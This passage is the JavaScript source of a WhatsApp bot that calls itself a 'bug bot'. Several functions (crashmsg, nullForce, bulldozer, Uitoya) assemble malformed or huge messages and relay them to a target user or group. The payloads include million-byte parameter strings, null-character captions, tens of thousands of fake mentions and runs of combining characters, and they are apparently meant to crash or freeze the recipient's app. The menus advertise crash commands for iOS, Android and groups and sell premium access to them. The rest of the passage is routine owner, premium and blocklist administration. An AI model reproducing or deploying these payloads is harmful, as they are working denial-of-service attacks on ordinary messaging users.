    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
    caption: "\u0000".repeat(104500),
  };

  let msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        albumMessage: {
          expectedImageCount: 666,
          expectedVideoCount: 0,
          items: [
            { 
              imageMessage: imageMsg 
            }
          ],
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, 
              () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            stanzaId: "1234567890ABCDEF",
            businessMessageForwardInfo: {
              businessOwnerJid: VariabelJid,
            },
          },
        },
      },
    },
  }, {});
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ? 
    { 
      messageId: msg.key.id, 
      participant: { jid: target } 
    } : { messageId: msg.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝗫 - 𝗭 𝗘 𝗡 𝗢", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target } 
    } : { messageId: payload.key.id }
  );
}



async function crashmsg(target) {
    try {
        const interactivePayload = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    jpegThumbnail: null
                },
                contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    conversionSource: "porn",
                    conversionData: crypto.randomBytes(16),
                    conversionDelaySeconds: 9999,
                    forwardingScore: 999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "Kornth",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "Telegram@LG_BAHIRAVA null 🦠"
                    },
                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },
                    expiration: -99999,
                    ephemeralSettingTimestamp: Date.now(),
                    ephemeralSharedSecret: crypto.randomBytes(16),
                    entryPointConversionSource: "WhatsaApp",
                    entryPointConversionApp: "WhatsApp",
                    actionLink: {
                        url: "t.me/Kornth_i",
                        buttonTitle: "action_button"
                    },
                    disappearingMode: {
                        initiator: 1,
                        trigger: 2,
                        initiatorDeviceJid: target,
                        initiatedByMe: true
                    },
                    groupSubject: "Telegram@LG_BAHIRAVA 🦠",
                    parentGroupJid: "0@g.us",
                    trustBannerType: "X",
                    trustBannerAction: 99999,
                    isSampled: true,
                    externalAdReply: {
                        title: "Telegram@LG_BAHIRAVA 🦠",
                        mediaType: 2,
                        renderLargerThumbnail: false,
                        showAdAttribution: false,
                        containsAutoReply: false,
                        body: "Ai Kornth ",
                        thumbnail: null,
                        sourceUrl: "t.me/Kornth_i",
                        sourceId: "9T7A4M1A",
                        ctwaClid: "ctwaClid",
                        ref: "ref",
                        clickToWhatsappCall: true,
                        ctaPayload: "ctaPayload",
                        disableNudge: true,
                        originalImageUrl: null
                    },
                    featureEligibilities: {
                        cannotBeReactedTo: true,
                        cannotBeRanked: true,
                        canRequestFeedback: true
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "0@newsletter",
                        serverMessageId: 1,
                        newsletterName: `Crash Kornth ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                        contentType: 3,
                        accessibilityText: "Telegram@LG_BAHIRAVA 🦠"
                    },
                    statusAttributionType: 2,
                    utm: {
                        utmSource: "XsSource",
                        utmCampaign: "XsCampaign"
                    }
                },
                body: {
                    text: "Telegram@LG_BAHIRAVA 🦠"
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "payment_method",
                        buttonParamsJson: `{}`
                    }]
                }
            }
        };

        const msg1 = generateWAMessageFromContent(target, interactivePayload, {});
        await XeonBotInc.relayMessage(target, msg1.message, { messageId: msg1.key.id });

        const paymentPayload = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'USD',
                requestFrom: target,
                expiryTimestamp: null,
                contextInfo: {
                    remoteJid: " S ",
                    isForwarded: true,
                    forwardingScore: 979,
                    externalAdReply: {
                        title: " ⁖Telegram@LG_BAHIRAVA system 🦠",
                        body: "Telegram@LG_BAHIRAVA 🦠",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewType: "VIDEO",
                        sourceUrl: "https://t.me/LG_BAHIRAVA",
                        mediaUrl: "https://t.me/LG_BAHIRAVA",
                        showAdAttribution: true,
                    }
                }
            }
        };

        await XeonBotInc.relayMessage(target, paymentPayload, {
            participant: { jid: target },
            quoted: null,
            userJid: null,
            messageId: null
        });
        
    } catch (err) {
        console.error("Error", err);
    }
}
    
    
    
 async function loading(from) {

    {

        console.error("Invalid  from  JID:", from);

        return;

    }

    const Floading = [

        "ℓσα∂ιηg.",

        "ℓσα∂ιηg..",

        "ℓσα∂ιηg..."

    ];

    let { key } = await XeonBotInc.sendMessage(from, { text: " " });

    for (let i = 0; i < Floading.length; i++) {

        await XeonBotInc.sendMessage(from, { text: Floading[i], edit: key });

    }

}   
    
//==============================================================\\
async function nullForce(XeonBotInc, target) {
    const message = {
      messageContextInfo: {
        messageSecret: crypto.randomBytes(32),
        deviceListMetadata: {
          senderKeyIndex: 0,
          senderTimestamp: Date.now(),
          recipientKeyIndex: 0
        }
      },
      interactiveResponseMessage: {
        contextInfo: {
          remoteJid: "status@broadcast",
          fromMe: true,
          isQuestion: true,
          forwardedAiBotMessageInfo: {
            botJid: "13135550202@bot",
            botName: "Business Assistant",
            creator: "FLIX"
          },
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 209000 }, () => ({
            participant: `${
              ['41','91','90','31','40'][Math.floor(Math.random()*5)]
            }${Math.floor(Math.random()*1e10).toString().padStart(10,'0')}@s.whatsapp.net`,
            type: 1
          }))
        },
        body: {
          text: "\u0000\u0000",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "kkk",
          version: 3
        }
      }
    };

    await XeonBotInc.relayMessage("status@broadcast", message, {

    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });    
}

async function bulldozer(target) {
	try{
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  console.log(chalk.green(`Delay strong sent to ${target}`));
  } catch (err) {
      console.error(err);
   }
}

async function Uitoya(target) {
  try {
    const Toyaexe2 = [
      {
        buttonId: ".id1",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id2",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id3",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      }
    ];

    const Toyaexe = {
      location: {
        degreesLatitude: -1,
        degreesLongitude: -1,
        name: "Mido here 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
        address:" Telegram@lejened_bahirava" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
      },
      caption: "Telegram@lejened_bahirava" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
      footer: " ",
      Toyaexe2,
      headerType: 6
    };

    await XeonBotInc.sendMessage(target, Toyaexe);
  } catch (err) {
  }
}

switch(command) {

case 'menu': {
const uptime = runtime(process.uptime())
const menuText = 
`
╔══════════════════╗
║ 🤖 𝗕𝗔𝗛𝗜𝗥𝗔𝗩𝗔 𝗕𝗨𝗚 𝗕𝗢𝗧🦄
╠══════════════════╣
╔══════════════════╗
║ 👤 User : ${pushname}
║ 🆔 Number : ${senderNumber}
║ 🎭 Mode : ${global.botMode.toUpperCase()}
║ ⏱ Uptime : ${uptime}
╚══════════════════╝
`
const buttons = [
  {
    buttonId: '.botmenu',
    buttonText: { displayText: '𐂡BOT MENU' },
    type: 1
  },
  {
    buttonId: '.newbug',
    buttonText: { displayText: '𐂡NEW BUG' },
    type: 1
  },
  {
    buttonId: '.bugmenu',
    buttonText: { displayText: '𐂡BUG  Menu' },
    type: 1
  }
  ]
await XeonBotInc.sendMessage(from, {
        image: { url: menuImage },
        caption: menuText,
        footer: '©𝗟𝗘𝗝𝗘𝗡𝗘𝗗 𝗕𝗔𝗛𝗜𝗥𝗔𝗩𝗔 𝗕𝗨𝗚 𝗕𝗢𝗧🦄',
        headerType: 4,
        buttons: buttons,
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: global.ownername,
                thumbnailUrl: menuthumb,
                mediaType: 1,
                renderLargerThumbnail: false,
                sourceUrl: 'https://whatsapp.com'
            },
            ...global.newsletterContext
        }
    }, { quoted: m });
}
break;

case 'botmenu': {
const uptime = runtime(process.uptime())
const menuText = `
╔══════════════════╗
║ 🤖 𝗕𝗔𝗛𝗜𝗥𝗔𝗩𝗔 𝗕𝗨𝗚 𝗕𝗢𝗧🦄
╠══════════════════╣
╔══════════════════╗
║ 👤 User : ${pushname}
║ 🆔 Number : ${senderNumber}
║ 🎭 Mode : ${global.botMode.toUpperCase()}
║ ⏱ Uptime : ${uptime}
╚══════════════════╝
╔══════════════════╗
║ 📌 MAIN / BASIC COMMANDS
╠══════════════════╣
║ • .menu
║ • .alive
║ • .ping
║ • .runtime
║ • .uptime
║ • .botstatus
║ • .mystatus
║ • .owner
║ • .staff
║ • .myid
║ • .groupid
║ • .count
║ • .online
╚══════════════════╝

╔══════════════════╗
║ 👑 OWNER ONLY
╠══════════════════╣
║ • .self
║ • .public
║ • .freemode
║ • .paidmode
║ • .addowner
║ • .delowner
║ • .listowner
║ • .clearowner
║ • .addpremium
║ • .delpremium
║ • .listpremium
║ • .clearpremium
║ • .eval / !eval
╚══════════════════╝

╔══════════════════╗
║ 🔗 PAIR / RENT SYSTEM
╠══════════════════╣
║ • .reqpair / !reqpair <number>
║ • .listpair / !listpair
║ • .delpair / !delpair
╚══════════════════╝

╔══════════════════╗
║ 👥 GROUP / ADMIN MANAGEMENT
╠══════════════════╣
║ • .listgc
║ • .open
║ • .close
║ • .setname
║ • .setdesc
║ • .linkgc
║ • .revokelink
║ • .admins
║ • .add
║ • .kick
║ • .promote
║ • .demote
║ • .leave
║ • .ginfo
║ • .inactive
║ • .resetgroup
╚══════════════════╝

╔══════════════════╗
║ 🛡 MODERATION & SECURITY
╠══════════════════╣
║ • .mute / !mute
║ • .unmute / !unmute
║ • .warn / !warn
║ • .unwarn / !unwarn
║ • .warnlist
║ • .clearwarn
║ • .report
║ • .antiboton
║ • .antibotoff
║ • .slowmode <sec>
║ • .removeslow
║ • .lockname
║ • .unlockname
╚══════════════════╝

╔══════════════════╗
║ 👤 USER MANAGEMENT (ADVANCED)
╠══════════════════╣
║ • .silent <time>
║ • .silentremove <time>
║ • .silentwarn <time>
║ • .silenttag <time>
║ • .ghostcheck
╚══════════════════╝

╔══════════════════╗
║ 🎙 VOICE & MEDIA
╠══════════════════╣
║ • .speakeng
║ • .speakurdu
║ • .say / !say
║ • .sticker
╚══════════════════╝

╔══════════════════╗
║ 📊 POLL & FUN
╠══════════════════╣
║ • .vote
║ • .poll question|opt1|opt2
║ • .quote
║ • .roll
║ • .flip
║ • .math
╚══════════════════╝

╔══════════════════╗
║ 🤖 AI COMMANDS
╠══════════════════╣
║ • .ai <question>
║ • .aishort
║ • .ailong
║ • .aifunny
║ • .aiurdu
║ • .airoman
║ • .aitranslate
║ • .aisummary
║ • .airewrite
║ • .aiexplain
╚══════════════════╝

╔══════════════════╗
║ 🧠 AI MODERATION
╠══════════════════╣
║ • .aitoxic
║ • .aispam
║ • .aibadword
║ • .aiscam
║ • .aimod
╚══════════════════╝

╔══════════════════╗
║ ✍️ AI TOOLS
╠══════════════════╣
║ • .aigrammar
║ • .aicaption
║ • .aibio
║ • .aiemoji
║ • .aihashtag
║ • .aicode
║ • .aicodefix
╚══════════════════╝

╔══════════════════╗
║ 🎮 AI FUN
╠══════════════════╣
║ • .aijoke
║ • .aiquote
║ • .aistory
║ • .airiddle
║ • .aitruth
║ • .aidare
║ • .airoast
║ • .aicompliment
║ • .ailove
║ • .aidaily
╚══════════════════╝
`
const buttons = [
   {
    buttonId: '.newbug',
    buttonText: { displayText: '𐂡NEW BUG' },
    type: 1
  },
  {
    buttonId: '.bugmenu',
    buttonText: { displayText: '𐂡BUG  Menu' },
    type: 1
  }
  ]
await XeonBotInc.sendMessage(from, {
        image: { url: menuImage },
        caption: menuText,
        footer: '©𝗟𝗘𝗝𝗘𝗡𝗘𝗗 𝗕𝗔𝗛𝗜𝗥𝗔𝗩𝗔 𝗕𝗨𝗚 𝗕𝗢𝗧🦄',
        headerType: 4,
        buttons: buttons,
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: global.ownername,
                thumbnailUrl: menuthumb,
                mediaType: 1,
                renderLargerThumbnail: false,
                sourceUrl: 'https://whatsapp.com'
            },
            ...global.newsletterContext
        }
    }, { quoted: m });
}
break;

case 'bugmenu': {
const uptime = runtime(process.uptime())
const menuText = `
╔═══════════════════╗
║ 👤 User : ${pushname}
║ 🆔 Number : ${senderNumber}
║ 🎭 Mode : ${global.botMode.toUpperCase()}
║ ⏱ Uptime : ${uptime}
╚═══════════════════╝
╔═══════════════════╗
║••►𝗙𝗢𝗥 𝗜𝗢𝗦 / 𝗜𝗣𝗛𝗢𝗡𝗘🦠
║••►iosinvisible
║••►iosinvisiblenew
║••►bugios
║••►𝗙𝗢𝗥 𝗔𝗡𝗗𝗥𝗢𝗜𝗗🦠
║••►bugdelayxcrash
║••►wacrash
║••►uispam
║••►killcall
║••►𝗕𝗨𝗚 𝗘𝗠𝗢𝗝𝗜🦠
║••►😡
║••►👻
║••►💋
║••►☠️
║••►𝗙𝗢𝗥 𝗚𝗥𝗢𝗨𝗣🦠 
║••►mixgc
║••►buggc
╚═══════════════════╝
`
const buttons = [
  {
    buttonId: '.botmenu',
    buttonText: { displayText: '𐂡BOT MENU' },
    type: 1
  },
  {
    buttonId: '.newbug',
    buttonText: { displayText: '𐂡NEW BUG' },
    type: 1
  },
  ]
await XeonBotInc.sendMessage(from, {
        image: { url: menuImage },
        caption: menuText,
        footer: '©𝗟𝗘𝗝𝗘𝗡𝗘𝗗 𝗕𝗔𝗛𝗜𝗥𝗔𝗕𝗔 𝗕𝗨𝗚 𝗕𝗢𝗧🦄',
        headerType: 4,
        buttons: buttons,
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: global.ownername,
                thumbnailUrl: menuthumb,
                mediaType: 1,
                renderLargerThumbnail: false,
                sourceUrl: 'https://whatsapp.com'
            },
            ...global.newsletterContext
        }
    }, { quoted: m });
}
break;



case 'newbug': {
const uptime = runtime(process.uptime())
const menuText = `
╔═══════════════════╗
║ 👤 User : ${pushname}
║ 🆔 Number : ${senderNumber}
║ 🎭 Mode : ${global.botMode.toUpperCase()}
║ ⏱ Uptime : ${uptime}
╚═══════════════════╝
╭━━━━━━━━━━━━━━━━━━━━╮
╭━━━━━━━━━━━━━╮
┃➤𝗕𝗨𝗚 𝗙𝗢𝗥 𝗚𝗣 𝗜𝗗🦠
╰━━━━━━━━━━━━━╯
┃➤ legendgpid1
┃➤ legendgpid2
┃➤ legendgpid3
┃➤ legendgpid4
╭━━━━━━━━━━━━━━━╮
┃➤𝗕𝗨𝗚 𝗙𝗢𝗥 𝗚𝗣 𝗟𝗜𝗡𝗞🦠 
╰━━━━━━━━━━━━━━━╯
┃➤ legendlink1
┃➤ legendlink2
┃➤ legendlink3
┃➤ legendlink4
╭━━━━━━━━━━━━━━━╮
┃➤𝗕𝗨𝗚 𝗙𝗢𝗥 𝗜𝗡 𝗣𝗟𝗔𝗖𝗘🦠
╰━━━━━━━━━━━━━━━╯
┃➤ legend1
┃➤ legend2
┃➤ legend3
┃➤ legend4
┃➤ legend5
┃➤ legend6
┃➤ legend7
┃➤ legend8
┃➤ legend9
╭━━━━━━━━━━━━━━━╮
┃➤𝗕𝗨𝗚 𝗙𝗢𝗥 𝗕𝗨𝗚 𝗡𝗨𝗠𝗕𝗘𝗥🦠
╰━━━━━━━━━━━━━━━╯
┃➤ legendkill1
┃➤ legendkill2
┃➤ legendkill3
┃➤ legendkill4
┃➤ legendkill5
╭━━━━━━━━━━━━━━━╮
┃➤𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣 𝗣𝗟𝗘𝗖𝗘🦠
╰━━━━━━━━━━━━━━━╯
┃➤ mrcrash
┃➤ tagallbug
╰━━━━━━━━━━━━━━━╯
╰━━━━━━━━━━━━━━━━━━━━╯
╭━━━━━━━━━━━━━━━━━━━━╮
┃➤ hidetag <text>
┃➤ delsession
┃➤ public
┃➤ self
┃➤ readviewonce
┃➤ ping
┃➤ addowner
┃➤ delowner
┃➤ addprem
┃➤ delprem
╰━━━━━━━━━━━━━━━━━━━━╯
`
const buttons = [
  {
    buttonId: '.botmenu',
    buttonText: { displayText: '🟡BOT MENU' },
    type: 1
  }
  ]
await XeonBotInc.sendMessage(from, {
        image: { url: menuImage },
        caption: menuText,
        footer: '©𝗟𝗘𝗝𝗘𝗡𝗘𝗗 𝗕𝗔𝗛𝗜𝗥𝗔𝗩𝗔 𝗕𝗨𝗚 𝗕𝗢𝗧🦄',
        headerType: 4,
        buttons: buttons,
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: global.ownername,
                thumbnailUrl: menuthumb,
                mediaType: 1,
                renderLargerThumbnail: false,
                sourceUrl: 'https://whatsapp.com'
            },
            ...global.newsletterContext
        }
    }, { quoted: m });
}
break;

case 'mystatus': {
const uptime = runtime(process.uptime())

const ownerStatus = isOwner(senderNumber) ? '✅ YES' : '❌ NO'
const premiumStatus = isPremium(senderNumber) ? '✅ YES' : '❌ NO'
const developerStatus = isDeveloper(senderNumber) ? '✅ YES' : '❌ NO'
const creatorStatus = isCreator ? '✅ YES' : '❌ NO'

let teks = `
╔════════════════════╗
      👤 *MY STATUS*
╚════════════════════╝

👤 Name        : ${pushname}
📱 Number      : wa.me/${senderNumber}

👑 Owner       : ${ownerStatus}
⭐ Premium     : ${premiumStatus}
🧑‍💻 Developer   : ${developerStatus}
🤖 Bot Creator : ${creatorStatus}

🎭 Bot Mode    : ${global.botMode.toUpperCase()}
🌐 Access      : ${global.public ? 'PUBLIC 🌍' : 'SELF 🔒'}
⏱ Uptime      : ${uptime}

╔════════════════════╗
   🤖 ${global.botname}
╚════════════════════╝
`

await XeonBotInc.sendMessage(from, {
  image: { url: menuImage },
  caption: teks,
  footer: '©𝗟𝗘𝗝𝗘𝗡𝗘𝗗 𝗕𝗔𝗛𝗜𝗥𝗔𝗩𝗔 𝗕𝗨𝗚 𝗕𝗢𝗧',
  contextInfo: {
    externalAdReply: {
      title: botname,
      body: global.ownername,
      thumbnailUrl: menuthumb,
      mediaType: 1,
      renderLargerThumbnail: false
    },
    ...global.newsletterContext
  }
}, { quoted: m })

}
break

case 'botstatus': {
  const uptime = runtime(process.uptime())

  const totalMem = os.totalmem()
  const freeMem = os.freemem()
  const usedMem = totalMem - freeMem

  const formatSize = (bytes) => {
    const sizes = ['Bytes', 'KB', 'MB', 'GB']
    if (bytes === 0) return '0 Byte'
    const i = Math.floor(Math.log(bytes) / Math.log(1024))
    return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i]
  }

  const owners = getOwner()
  const premiums = getPremium()

  let teks = `
╔═══════════════════╗
  🤖 *BOT FULL STATUS*\n\n`
  teks += `📛 Name : ${global.botname}\n`
  teks += `👑 Owner : ${global.ownername}\n`
  teks += `📱 Bot Number : wa.me/${botId}\n\n`

  teks += `🎭 Mode : ${global.botMode.toUpperCase()}\n`
  teks += `🌐 Access : ${global.public ? 'PUBLIC 🌍' : 'SELF 🔒'}\n`
  teks += `⏱ Uptime : ${uptime}\n\n`

  teks += `🧠 RAM Used : ${formatSize(usedMem)}\n`
  teks += `💾 Total RAM : ${formatSize(totalMem)}\n`
  teks += `🖥 Platform : ${os.platform()} (${os.arch()})\n`
  teks += `⚙ Node.js : ${process.version}\n\n`

  teks += `👑 Owners : ${owners.length}\n`
  teks += `⭐ Premium Users : ${premiums.length}\n`
  teks += `🛡 Security : ACTIVE\n
╚═══════════════════╝
`

  replygcxeon(teks)
}
break

case 'paidmode': {
  if (!isCreator) return replygcxeon('❌ Only Owner Can Use This Command')

  global.botMode = 'paid'
  replygcxeon('🔒 Bot is now in *PAID MODE*\n\nOnly Owner & Premium can use commands')
}
break

case 'freemode': {
  if (!isCreator) return replygcxeon('❌ Only Owner Can Use This Command')

  global.botMode = 'free'
  replygcxeon('✅ Bot is now in *FREE MODE*\n\nEveryone can use commands')
}
break

case 'cleardatabase': {
   if (!isDeveloper(senderNumber))
  return replygcxeon('Only Developer Use This Command\n\nWhatsApp Contact\n\nhttps://wa.me/+94701475778\nhttps://wa.me/+94701475778')
  fs.writeFileSync(premiumFile, JSON.stringify([], null, 2))

  fs.writeFileSync(blocklistFile, JSON.stringify([], null, 2))

  fs.writeFileSync(ownerFile, JSON.stringify([senderNumber], null, 2))
  const pairingPath = './lib2/pairing'
  if (fs.existsSync(pairingPath)) {
    fs.rmSync(pairingPath, { recursive: true, force: true })
    fs.mkdirSync(pairingPath)
  }

  replygcxeon(
`🧹 *DATABASE CLEARED SUCCESSFULLY*

👑 Owner   : RESET (you kept)
⭐ Premium : CLEARED
🛑 Blocklist : CLEARED
🔗 Pairing : CLEARED
🧠 Developer : SAFE (unchanged)`
  )
}
break

case 'clearpair': {
   if (!isDeveloper(senderNumber))
  return replygcxeon('Only Developer Use This Command\n\nWhatsApp Contact\n\nhttps://wa.me/+94701475778\nhttps://wa.me/+94701475778')

  const pairingPath = './lib2/pairing'

  if (!fs.existsSync(pairingPath))
    return replygcxeon('📭 No paired devices found')

  fs.rmSync(pairingPath, { recursive: true, force: true })
  fs.mkdirSync(pairingPath)

  replygcxeon('✅ All paired devices have been cleared')
}
break

case 'clearprem': {
   if (!isDeveloper(senderNumber))
  return replygcxeon('Only Developer Use This Command\n\nWhatsApp Contact\n\nhttps://wa.me/+94701475778\nhttps://wa.me/+94701475778')

  fs.writeFileSync(premiumFile, JSON.stringify([], null, 2))

  replygcxeon('✅ All premium users have been cleared')
}
break

case 'clearowner': {
   if (!isDeveloper(senderNumber))
  return replygcxeon('Only Developer Use This Command\n\nWhatsApp Contact\n\nhttps://wa.me/+94701475778\nhttps://wa.me/+94701475778')

  fs.writeFileSync(ownerFile, JSON.stringify([senderNumber], null, 2))

  replygcxeon('⚠️ All owners cleared\n👑 You are kept as the only owner')
}
break

case 'clearblocklist': {
   if (!isDeveloper(senderNumber))
  return replygcxeon('Only Developer Use This Command\n\nWhatsApp Contact\n\nhttps://wa.me/+94701475778\nhttps://wa.me/+94701475778')

  fs.writeFileSync(blocklistFile, JSON.stringify([], null, 2))

  replygcxeon('🧹 Blocklist has been completely cleared')
}
break



case 'addblocklist': {
  if (!isDeveloper(senderNumber))
  return replygcxeon('Only Developer Use This Command\n\nWhatsApp Contact\n\nhttps://wa.me/+94701475778\nhttps://wa.me/+94701475778')

  if (!q)
    return replygcxeon(`Example:\n${prefix}addblocklist 923xxxxxxxxx`)

  const num = q.replace(/[^0-9]/g, '')
  if (!num)
    return replygcxeon('❌ Invalid number')

  const blocklist = getBlocklist()
  if (blocklist.includes(num))
    return replygcxeon('⚠️ Number already in blocklist')

  blocklist.push(num)
  saveBlocklist(blocklist)

  replygcxeon(`✅ Number added to blocklist:\nwa.me/${num}`)
}
break

case 'delblocklist': {
  if (!isDeveloper(senderNumber))
  return replygcxeon('Only Developer Use This Command\n\nWhatsApp Contact\n\nhttps://wa.me/+94701475778\nhttps://wa.me/+94701475778')

  if (!q)
    return replygcxeon(`Example:\n${prefix}delblocklist 923xxxxxxxxx`)

  const num = q.replace(/[^0-9]/g, '')
  const blocklist = getBlocklist()

  if (!blocklist.includes(num))
    return replygcxeon('❌ Number not found in blocklist')

  const newList = blocklist.filter(n => n !== num)
  saveBlocklist(newList)

  replygcxeon(`❌ Number removed from blocklist:\nwa.me/${num}`)
}
break

case 'listblocklist': {
  if (!isDeveloper(senderNumber))
  return replygcxeon('Only Developer Use This Command\n\nWhatsApp Contact\n\nhttps://wa.me/+94701475778\nhttps://wa.me/+94701475778')

  const blocklist = getBlocklist()
  if (blocklist.length === 0)
    return replygcxeon('📭 Blocklist is empty')

  let teks = `🛑 *BLOCKLIST NUMBERS*\n\n`
  blocklist.forEach((num, i) => {
    teks += `${i + 1}. wa.me/${num}\n`
  })

  replygcxeon(teks)
}
break

case 'checkblocklist': {
   if (!isDeveloper(senderNumber))
  return replygcxeon('Only Developer Use This Command\n\nWhatsApp Contact\n\nhttps://wa.me/+94704703791\nhttps://wa.me/+94704703791')

  if (!q)
    return replygcxeon(`Example:\n${prefix}checkblocklist 923xxxxxxxxx`)

  const num = q.replace(/[^0-9]/g, '')

  if (isBlockedTarget(num)) {
    replygcxeon(`🔒 wa.me/${num}\nStatus: BLOCKED ✅`)
  } else {
    replygcxeon(`🔓 wa.me/${num}\nStatus: NOT BLOCKED ❌`)
  }
}
break

case 'addprem': {
  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
    'WhatsApp Contact:\n' +
    'https://wa.me/+94704703791\n' +
    'https://wa.me/+94704703791'
  )
}

  let num = q.replace(/[^0-9]/g, '')
  if (!num) return replygcxeon('Example: .addprem 94701475778')

  addPremium(num)
  replygcxeon(`✅ Premium added: ${num}`)
}
break

case 'delprem': {
  if (
  global.botMode === 'paid' &&
  !isOwner(senderNumber) &&
  !isPremium(senderNumber)
) {
  return replygcxeon(
    '🔒 *PAID COMMAND*\n\n' +
    'Buy premium to use this command\n\n' +
